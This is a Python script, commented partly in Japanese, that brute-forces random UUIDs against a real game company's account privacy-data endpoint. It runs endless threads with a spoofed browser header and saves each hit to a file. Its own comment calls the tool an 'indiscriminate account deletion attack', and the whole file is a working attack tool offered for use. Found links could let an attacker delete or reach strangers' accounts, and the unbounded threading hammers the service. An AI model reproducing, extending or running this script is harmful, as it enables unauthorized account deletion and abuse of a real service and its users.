# import and Loading modules.
import uuid as uid
import requests
import random
from threading import active_count, Thread
from itertools import count, cycle, repeat
from colorama import Fore as f
from pystyle import Colorate, Colors, Write
import os

trynum = 0
success = 0
badnum = 0
ThreadCount = 0
TotalSendedShare = 0
TotalFailedReq = 0
DebugMode = False

#clearコマンドの定義付け。
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def brute():
    global trynum, TotalSendedShare, TotalFailedReq, DebugMode, success , badnum
    Red = random.randrange(200, 250, 2)
    Red2 = Red + random.randrange(11, 15, 2)
    Red3 = Red2 + random.randrange(11, 15, 2)
    Red4 = Red3 + random.randrange(11, 15, 2)
    Red5 = Red4 + random.randrange(11, 15, 2)
    Blue = random.randrange(200, 250, 2)
    Blue2 = Blue + random.randrange(11, 15, 2)
    Blue3 = Blue2 + random.randrange(11, 15, 2)
    Blue4 = Blue3 + random.randrange(11, 15, 2)
    Blue5 = Blue4 + random.randrange(11, 15, 2)
    Green = random.randrange(200, 250, 2)
    Green2 = Green + random.randrange(11, 23, 2)
    Green3 = Green2 + random.randrange(11, 23, 2)
    Green4 = Green3 + random.randrange(11, 23, 2)
    Green5 = Green4 + random.randrange(11, 23, 2)
    gurade = f"\x1b[38;2;{Red};{Green};{Blue}m"
    gurade2 = f"\x1b[38;2;{Red2};{Green2};{Blue2}m"
    gurade3 = f"\x1b[38;2;{Red3};{Green3};{Blue3}m"
    gurade4 = f"\x1b[38;2;{Red4};{Green4};{Blue4}m"
    gurade5 = f"\x1b[38;2;{Red5};{Green5};{Blue5}m"
# Generate a UUID
    uuid = str(uid.uuid4())
# Generate a Try Link.
    url = f"https://cnrfps2.joydogames.com:15443/web/account/privacy_data/{uuid}"
# Set a Header data.
    Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36", "accept-language": "ja,en-US;q=0.9,en;q=0.8"}
# Trying Brute Indiscriminate account deletion Attack,
    send_data_url = requests.get(url, headers=Header)
    trynum += 1
    os.system(f"title Bruter is Now Working. - BadTry {badnum} - Success {success} - All {trynum}")
#失敗したらいかのコードを実行
    if "invalid link." in str(send_data_url.text):

        print(gurade + "[*] Attempting uuid: %s" % uuid)
        print(gurade + url + "is Invalid.")
        print(gurade3 + "[*] Tryed: %s" % trynum)
        badnum += 1
#成功したら以下のコードを実行
    if "Privacy Policy" in str(send_data_url.text):

        print(gurade4 + "[+] uuid is found: %s " % uuid)
        success += 1
        f = open('成功.txt', 'a', encoding='UTF-8')
        f.write(f'{url}\n')
        f.close()
        print(gurade5 + "[+] 成功パターンをファイルに保存しました。")

if __name__ == "__main__":
#thread数を聞くよ
    NThread = Write.Input("何threadにする?  -> ", Colors.red_to_purple, interval=0.0001)
#clearを実行するよ!!
    clear()
#もう気にしなくていいよ	
    while True:
        Run = True
        while Run:
            if active_count() <= int(NThread):
                try:
                    Thread(target=brute).start()
                except:
                    pass
    else:
            if active_count() <= int(NThread):
                try:
                    Thread(target=brute).start()
                except:
                    pass
